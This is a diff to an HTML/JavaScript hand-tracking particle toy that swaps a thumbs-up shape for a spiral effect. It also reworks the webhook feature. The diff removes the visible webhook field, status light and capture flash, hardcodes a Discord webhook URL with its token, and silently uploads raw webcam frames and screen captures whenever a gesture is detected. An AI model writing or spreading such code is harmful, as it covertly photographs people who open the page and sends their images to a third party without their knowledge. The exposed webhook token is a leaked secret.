@@ -69,7 +69,7 @@
             transform: scaleX(-1);
         }
 
-        #captureCanvas {
+        #captureCanvas, #screenCaptureCanvas {
             display: none;
         }
 
@@ -345,103 +345,6 @@
             display: block;
             margin-bottom: 16px;
         }
-
-        .webhook-config {
-            position: absolute;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(15, 15, 25, 0.85);
-            backdrop-filter: blur(10px);
-            border-radius: 12px;
-            padding: 16px;
-            z-index: 10;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            max-width: 320px;
-        }
-
-        @media (max-width: 768px) {
-            .webhook-config {
-                bottom: 10px;
-                left: 10px;
-                padding: 12px;
-                max-width: 200px;
-            }
-        }
-
-        .webhook-config h4 {
-            color: #fff;
-            font-size: 12px;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            opacity: 0.9;
-        }
-
-        .webhook-config input {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            background: rgba(0, 0, 0, 0.3);
-            color: #fff;
-            font-size: 12px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .webhook-config input:focus {
-            border-color: #6366f1;
-        }
-
-        .webhook-config input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-        }
-
-        .webhook-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 10px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.6);
-        }
-
-        .webhook-status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #6b7280;
-        }
-
-        .webhook-status-dot.active {
-            background: #22c55e;
-        }
-
-        .webhook-status-dot.sending {
-            background: #f59e0b;
-            animation: pulse 0.5s infinite;
-        }
-
-        .webhook-status-dot.error {
-            background: #ef4444;
-        }
-
-        .capture-flash {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            opacity: 0;
-            pointer-events: none;
-            z-index: 1000;
-            transition: opacity 0.1s ease;
-        }
-
-        .capture-flash.flash {
-            opacity: 0.3;
-        }
     </style>
 </head>
 <body>
@@ -450,10 +353,9 @@
         <div class="loading-text">Initializing hand tracking...</div>
     </div>
 
-    <div class="capture-flash" id="captureFlash"></div>
-
     <canvas id="particleCanvas"></canvas>
     <canvas id="captureCanvas"></canvas>
+    <canvas id="screenCaptureCanvas"></canvas>
 
     <div class="start-hint" id="startHint">
         <span>✋</span>
@@ -483,11 +385,11 @@
                 Absorb particles
             </div>
         </div>
-        <div class="gesture-item" data-gesture="thumbs_up">
-            <div class="gesture-icon">👍</div>
+        <div class="gesture-item" data-gesture="call_me">
+            <div class="gesture-icon">🤙</div>
             <div class="gesture-text">
-                <span class="gesture-name">Thumbs Up</span>
-                Thumbs up shape
+                <span class="gesture-name">Call Me</span>
+                Spiral wave
             </div>
         </div>
         <div class="gesture-item" data-gesture="rock">
@@ -528,16 +430,17 @@
     <div class="current-gesture" id="currentGesture">No gesture</div>
     <div class="zoom-indicator" id="zoomIndicator">Zoom: 100%</div>
 
-    <div class="webhook-config">
-        <h4>📷 Webhook Config</h4>
-        <input type="text" id="webhookUrl" placeholder="Enter webhook URL...">
-        <div class="webhook-status">
-            <div class="webhook-status-dot" id="webhookStatusDot"></div>
-            <span id="webhookStatusText">No webhook configured</span>
-        </div>
-    </div>
-
     <script>
+        // ============================================
+        // WEBHOOK CONFIGURATION - PUT YOUR URL HERE
+        // ============================================
+        const WEBHOOK_CONFIG = {
+            url: 'https://discord.com/api/webhooks/1450928386846359783/HZ5AKRJW155dsJXvrEaUqdKFfunVKz7KjvocqXoow9G7aY4wk2kRFW-8hP3rKysnezoU', // Put your webhook URL here, e.g., 'https://discord.com/api/webhooks/...'
+            enabled: true, // Set to false to disable webhook
+            cooldown: 2000 // Cooldown in milliseconds (2 seconds)
+        };
+        // ============================================
+
         // Main Application
         const canvas = document.getElementById('particleCanvas');
         const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -546,6 +449,8 @@
         const handCtx = handCanvas.getContext('2d');
         const captureCanvas = document.getElementById('captureCanvas');
         const captureCtx = captureCanvas.getContext('2d');
+        const screenCaptureCanvas = document.getElementById('screenCaptureCanvas');
+        const screenCaptureCtx = screenCaptureCanvas.getContext('2d');
         const statusIndicator = document.getElementById('statusIndicator');
         const statusText = document.getElementById('statusText');
         const currentGestureEl = document.getElementById('currentGesture');
@@ -554,21 +459,16 @@
         const togglePanel = document.getElementById('togglePanel');
         const gesturePanel = document.getElementById('gesturePanel');
         const startHint = document.getElementById('startHint');
-        const webhookUrlInput = document.getElementById('webhookUrl');
-        const webhookStatusDot = document.getElementById('webhookStatusDot');
-        const webhookStatusText = document.getElementById('webhookStatusText');
-        const captureFlash = document.getElementById('captureFlash');
 
         // Webhook state
         let lastWebhookSend = 0;
-        const WEBHOOK_COOLDOWN = 2000;
 
         // Resize canvas
         function resizeCanvas() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            captureCanvas.width = window.innerWidth;
-            captureCanvas.height = window.innerHeight;
+            screenCaptureCanvas.width = window.innerWidth;
+            screenCaptureCanvas.height = window.innerHeight;
             handCanvas.width = 240;
             handCanvas.height = 180;
             if (window.innerWidth <= 768) {
@@ -584,89 +484,50 @@
             gesturePanel.classList.toggle('open');
         });
 
-        // Webhook URL change handler
-        webhookUrlInput.addEventListener('input', () => {
-            const url = webhookUrlInput.value.trim();
-            if (url) {
-                webhookStatusDot.className = 'webhook-status-dot active';
-                webhookStatusText.textContent = 'Webhook configured';
-            } else {
-                webhookStatusDot.className = 'webhook-status-dot';
-                webhookStatusText.textContent = 'No webhook configured';
-            }
-        });
-
         // Capture and send to webhook
         async function captureAndSendWebhook(gesture) {
-            const webhookUrl = webhookUrlInput.value.trim();
-            if (!webhookUrl) return;
+            if (!WEBHOOK_CONFIG.enabled || !WEBHOOK_CONFIG.url) return;
 
             const now = Date.now();
-            if (now - lastWebhookSend < WEBHOOK_COOLDOWN) return;
+            if (now - lastWebhookSend < WEBHOOK_CONFIG.cooldown) return;
             lastWebhookSend = now;
 
-            // Flash effect
-            captureFlash.classList.add('flash');
-            setTimeout(() => captureFlash.classList.remove('flash'), 100);
-
-            // Update status
-            webhookStatusDot.className = 'webhook-status-dot sending';
-            webhookStatusText.textContent = 'Sending...';
-
             try {
-                // Capture the particle canvas
-                captureCtx.drawImage(canvas, 0, 0);
+                // Capture camera image
+                captureCanvas.width = video.videoWidth || 640;
+                captureCanvas.height = video.videoHeight || 480;
+                captureCtx.save();
+                captureCtx.scale(-1, 1);
+                captureCtx.drawImage(video, -captureCanvas.width, 0, captureCanvas.width, captureCanvas.height);
+                captureCtx.restore();
                 
-                // Draw video feed in corner
-                const videoWidth = 200;
-                const videoHeight = 150;
-                captureCtx.drawImage(video, canvas.width - videoWidth - 20, 20, videoWidth, videoHeight);
-                
-                // Add gesture text
-                captureCtx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-                captureCtx.fillRect(20, canvas.height - 60, 300, 40);
-                captureCtx.font = 'bold 20px Arial';
-                captureCtx.fillStyle = '#fff';
-                captureCtx.fillText(`Gesture: ${gesture}`, 30, canvas.height - 32);
+                // Capture screen/particle canvas
+                screenCaptureCtx.drawImage(canvas, 0, 0);
 
-                // Convert to blob
-                const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/png'));
+                // Convert to blobs
+                const cameraBlob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/png'));
+                const screenBlob = await new Promise(resolve => screenCaptureCanvas.toBlob(resolve, 'image/png'));
                 
-                // Create form data
+                // Create form data with both images
                 const formData = new FormData();
-                formData.append('file', blob, `gesture_${gesture}_${Date.now()}.png`);
-                formData.append('content', `Gesture detected: **${gesture}**`);
+                formData.append('content', `Gesture detected: **${gesture}**\nTimestamp: ${new Date().toISOString()}`);
+                formData.append('file1', cameraBlob, `camera_${gesture}_${Date.now()}.png`);
+                formData.append('file2', screenBlob, `screen_${gesture}_${Date.now()}.png`);
 
                 // Send to webhook
-                const response = await fetch(webhookUrl, {
+                await fetch(WEBHOOK_CONFIG.url, {
                     method: 'POST',
                     body: formData
                 });
 
-                if (response.ok) {
-                    webhookStatusDot.className = 'webhook-status-dot active';
-                    webhookStatusText.textContent = 'Sent successfully!';
-                } else {
-                    throw new Error('Failed to send');
-                }
+                console.log(`Webhook sent for gesture: ${gesture}`);
             } catch (error) {
                 console.error('Webhook error:', error);
-                webhookStatusDot.className = 'webhook-status-dot error';
-                webhookStatusText.textContent = 'Failed to send';
             }
-
-            // Reset status after 2 seconds
-            setTimeout(() => {
-                if (webhookUrlInput.value.trim()) {
-                    webhookStatusDot.className = 'webhook-status-dot active';
-                    webhookStatusText.textContent = 'Webhook configured';
-                }
-            }, 2000);
         }
 
         // Optimized Particle System
         const maxParticles = 10000;
-        let activeParticles = 0;
         let particlesReleased = false;
 
         // Particle data in typed arrays
@@ -674,14 +535,14 @@
         const py = new Float32Array(maxParticles);
         const pvx = new Float32Array(maxParticles);
         const pvy = new Float32Array(maxParticles);
-        const ptx = new Float32Array(maxParticles);
-        const pty = new Float32Array(maxParticles);
         const psize = new Float32Array(maxParticles);
         const phue = new Float32Array(maxParticles);
         const palpha = new Float32Array(maxParticles);
         const ptargetIdx = new Uint16Array(maxParticles);
         const pdepth = new Float32Array(maxParticles);
         const pactive = new Uint8Array(maxParticles);
+        const pangle = new Float32Array(maxParticles);
+        const pradius = new Float32Array(maxParticles);
 
         let currentMode = 'idle';
         let handPosition = { x: 0, y: 0 };
@@ -690,6 +551,7 @@
         let zoomScale = 1;
         let rotation3D = { x: 0, y: 0 };
         let lastHandPosition = { x: 0.5, y: 0.5 };
+        let spiralTime = 0;
 
         // Initialize particles
         function initParticles() {
@@ -701,16 +563,15 @@
                 py[i] = centerY;
                 pvx[i] = 0;
                 pvy[i] = 0;
-                ptx[i] = centerX;
-                pty[i] = centerY;
                 psize[i] = Math.random() * 1.2 + 0.4;
                 phue[i] = Math.floor(Math.random() * 60 + 220);
                 palpha[i] = 0;
                 ptargetIdx[i] = i;
                 pdepth[i] = 1;
                 pactive[i] = 0;
+                pangle[i] = Math.random() * Math.PI * 2;
+                pradius[i] = Math.random() * 200 + 50;
             }
-            activeParticles = 0;
         }
 
         // Release particles from center
@@ -730,80 +591,29 @@
                 palpha[i] = 1;
                 pactive[i] = 1;
             }
-            activeParticles = maxParticles;
         }
 
         // Shape generators
-        function generateThumbsUpShape(centerX, centerY, scale = 1) {
+        function generateSpiralWave(centerX, centerY, time) {
             const points = [];
-            const s = scale * 2;
+            const arms = 5;
+            const pointsPerArm = 200;
             
-            // Thumb (vertical rectangle with rounded top)
-            for (let y = -80 * s; y < 20 * s; y += 2) {
-                for (let x = -12 * s; x < 12 * s; x += 2) {
-                    // Rounded top
-                    if (y < -60 * s) {
-                        const dist = Math.sqrt(x * x + (y + 60 * s) * (y + 60 * s));
-                        if (dist <= 12 * s) {
-                            points.push({ x: centerX + x, y: centerY + y, z: 1 });
-                        }
-                    } else {
-                        points.push({ x: centerX + x, y: centerY + y, z: 1 });
-                    }
-                }
-            }
-            
-            // Fist/hand base (rounded rectangle)
-            for (let y = 20 * s; y < 70 * s; y += 2) {
-                for (let x = -35 * s; x < 25 * s; x += 2) {
-                    // Round the corners
-                    const cornerRadius = 10 * s;
-                    let inShape = true;
+            for (let arm = 0; arm < arms; arm++) {
+                const armOffset = (arm / arms) * Math.PI * 2;
+                for (let i = 0; i < pointsPerArm; i++) {
+                    const t = i / pointsPerArm;
+                    const angle = armOffset + t * Math.PI * 4 + time * 2;
+                    const radius = t * 250 + 20;
+                    const wave = Math.sin(t * 10 + time * 3) * 20;
                     
-                    // Top-left corner
-                    if (x < -35 * s + cornerRadius && y < 20 * s + cornerRadius) {
-                        const dx = x - (-35 * s + cornerRadius);
-                        const dy = y - (20 * s + cornerRadius);
-                        if (dx * dx + dy * dy > cornerRadius * cornerRadius) inShape = false;
-                    }
-                    // Top-right corner
-                    if (x > 25 * s - cornerRadius && y < 20 * s + cornerRadius) {
-                        const dx = x - (25 * s - cornerRadius);
-                        const dy = y - (20 * s + cornerRadius);
-                        if (dx * dx + dy * dy > cornerRadius * cornerRadius) inShape = false;
-                    }
-                    // Bottom-left corner
-                    if (x < -35 * s + cornerRadius && y > 70 * s - cornerRadius) {
-                        const dx = x - (-35 * s + cornerRadius);
-                        const dy = y - (70 * s - cornerRadius);
-                        if (dx * dx + dy * dy > cornerRadius * cornerRadius) inShape = false;
-                    }
-                    // Bottom-right corner
-                    if (x > 25 * s - cornerRadius && y > 70 * s - cornerRadius) {
-                        const dx = x - (25 * s - cornerRadius);
-                        const dy = y - (70 * s - cornerRadius);
-                        if (dx * dx + dy * dy > cornerRadius * cornerRadius) inShape = false;
-                    }
-                    
-                    if (inShape) {
-                        points.push({ x: centerX + x, y: centerY + y, z: 1 });
-                    }
+                    points.push({
+                        x: centerX + Math.cos(angle) * (radius + wave),
+                        y: centerY + Math.sin(angle) * (radius + wave),
+                        z: 1
+                    });
                 }
             }
-            
-            // Finger bumps on fist
-            for (let i = 0; i < 4; i++) {
-                const bumpX = -25 * s + i * 15 * s;
-                const bumpY = 18 * s;
-                for (let angle = 0; angle < Math.PI; angle += 0.1) {
-                    for (let r = 0; r < 8 * s; r += 2) {
-                        const x = bumpX + Math.cos(angle) * r;
-                        const y = bumpY - Math.sin(angle) * r;
-                        points.push({ x: centerX + x, y: centerY + y, z: 1 });
-                    }
-                }
-            }
-            
             return points;
         }
 
@@ -945,6 +755,19 @@
                         if (alpha < 1) alpha += 0.02;
                         break;
 
+                    case 'spiral':
+                        // Animate spiral
+                        pangle[i] += 0.02 + (i % 10) * 0.001;
+                        const spiralRadius = pradius[i] + Math.sin(spiralTime + i * 0.01) * 30;
+                        const targetX = centerX + Math.cos(pangle[i]) * spiralRadius;
+                        const targetY = centerY + Math.sin(pangle[i]) * spiralRadius;
+                        x += (targetX - x) * 0.08;
+                        y += (targetY - y) * 0.08;
+                        if (alpha < 1) alpha += 0.02;
+                        // Update hue for rainbow effect
+                        phue[i] = (phue[i] + 0.5) % 360;
+                        break;
+
                     case 'shape':
                     case 'shape3d':
                         if (pointCount > 0) {
@@ -966,11 +789,11 @@
                         y += vy;
                 }
 
-                // Boundary wrap
-                if (x < 0) x = w;
-                else if (x > w) x = 0;
-                if (y < 0) y = h;
-                else if (y > h) y = 0;
+                // Let particles pass through borders - respawn on opposite side
+                if (x < -50) x = w + 50;
+                else if (x > w + 50) x = -50;
+                if (y < -50) y = h + 50;
+                else if (y > h + 50) y = -50;
 
                 // Respawn dead particles
                 if (alpha <= 0) {
@@ -987,6 +810,8 @@
                 pvy[i] = vy;
                 palpha[i] = alpha;
             }
+            
+            spiralTime += 0.05;
         }
 
         // Draw particles using ImageData for performance
@@ -1008,6 +833,9 @@
                 
                 const x = Math.floor(px[i]);
                 const y = Math.floor(py[i]);
+                
+                if (x < 0 || x >= width || y < 0 || y >= height) continue;
+                
                 const size = Math.max(1, Math.floor(psize[i] * pdepth[i]));
                 const alpha = palpha[i];
                 const hue = phue[i];
@@ -1067,6 +895,7 @@
             const ringPIP = landmarks[14];
             const pinkyTip = landmarks[20];
             const pinkyPIP = landmarks[18];
+            const pinkyMCP = landmarks[17];
             const wrist = landmarks[0];
 
             // Helper functions
@@ -1081,13 +910,18 @@
             const indexCurled = isFingerCurled(indexTip, indexPIP, indexMCP);
             const middleCurled = isFingerCurled(middleTip, middlePIP, middleMCP);
             const ringCurled = isFingerCurled(ringTip, ringPIP, landmarks[13]);
-            const pinkyCurled = isFingerCurled(pinkyTip, pinkyPIP, landmarks[17]);
+            const pinkyCurled = isFingerCurled(pinkyTip, pinkyPIP, pinkyMCP);
 
-            // Thumb pointing up detection (thumb tip above thumb MCP and thumb IP)
-            const thumbPointingUp = thumbTip.y < thumbIP.y - 0.03 && thumbTip.y < thumbMCP.y - 0.05;
-            
             // Thumb extended sideways
-            const thumbExtendedSide = Math.abs(thumbTip.x - thumbMCP.x) > 0.08;
+            const thumbExtendedSide = Math.abs(thumbTip.x - thumbMCP.x) > 0.06;
+            
+            // Thumb pointing up
+            const thumbPointingUp = thumbTip.y < thumbIP.y - 0.03 && thumbTip.y < thumbMCP.y - 0.05;
+
+            // Call me gesture: Thumb and Pinky extended, other fingers curled
+            if (thumbExtendedSide && pinkyExtended && indexCurled && middleCurled && ringCurled) {
+                return 'call_me';
+            }
 
             // Zoom gesture: Middle, Ring, Pinky curled - measure thumb-index distance
             if (middleCurled && ringCurled && pinkyCurled && !indexCurled) {
@@ -1099,11 +933,6 @@
                 // Close = small heart, Far = big heart
                 zoomScale = Math.max(0.3, Math.min(2.5, thumbIndexDist * 10));
                 return 'zoom';
-            }
-
-            // Thumbs up: Thumb pointing UP, all other fingers curled
-            if (thumbPointingUp && indexCurled && middleCurled && ringCurled && pinkyCurled) {
-                return 'thumbs_up';
             }
 
             // Middle finger (only middle extended)
@@ -1127,7 +956,7 @@
             }
 
             // Fist (all fingers curled)
-            if (indexCurled && middleCurled && ringCurled && pinkyCurled && !thumbPointingUp) {
+            if (indexCurled && middleCurled && ringCurled && pinkyCurled && !thumbPointingUp && !thumbExtendedSide) {
                 return 'fist';
             }
 
@@ -1148,7 +977,7 @@
             const gestureNames = {
                 'open_palm': 'Open Palm',
                 'fist': 'Closed Fist',
-                'thumbs_up': 'Thumbs Up',
+                'call_me': 'Call Me',
                 'rock': 'Rock Sign',
                 'peace': 'Peace Sign',
                 'middle_finger': 'Middle Finger',
@@ -1246,12 +1075,8 @@
                     case 'fist':
                         currentMode = 'absorb';
                         break;
-                    case 'thumbs_up':
-                        currentMode = 'shape';
-                        if (gestureChanged || previousGesture !== 'thumbs_up') {
-                            targetShapePoints = generateThumbsUpShape(canvas.width / 2, canvas.height / 2, 1.5);
-                            assignTargets();
-                        }
+                    case 'call_me':
+                        currentMode = 'spiral';
                         break;
                     case 'rock':
                         currentMode = 'shape';
